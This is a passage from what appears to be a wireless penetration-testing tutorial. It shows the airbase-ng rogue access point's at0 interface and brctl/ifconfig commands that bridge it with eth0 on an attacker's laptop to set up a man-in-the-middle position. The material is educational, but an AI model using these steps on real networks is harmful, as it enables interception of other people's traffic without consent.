    \  Access Point with BSSID 80:1F:02:8F:34:D5 started.\n```\n\n+   2. It is important\
    \ to note that airbase-ng, when run, creates an interface at0 (a tap interface).\
    \ Think of this as the wired-side interface of our software-based access point\
    \ mitm:\n\n```\nroot@kali:~# ifconfig at0\nat0      Link encap:Ethernet  HWaddr\
    \ 80:1f:02:8f:34:d5\n         BROADCAST MULTICAST  MTU:1500  Metric:1\n      \
    \   RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n         TX packets:0\
    \ errors:0 dropped:0 overruns:0 carrier:0\n         collisions:0 txqueuelen:500\n\
    \         RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n```\n\n+   3. Let's now create\
    \ a bridge on the hacker's laptop, consisting of the wired (eth0) and wireless\
    \ interface (at0). The succession of commands used for this is as follows:\n\n\
    +   - [x] brctl addbr mitm-bridge\n- [x] brctl addif mitm-bridge eth0\n- [x] brctl\
    \ addif mitm-bridge at0\n- [x] ifconfig eth0 0.0.0.0 up\n- [x] ifconfig at0 0.0.0.0\
    \ up"
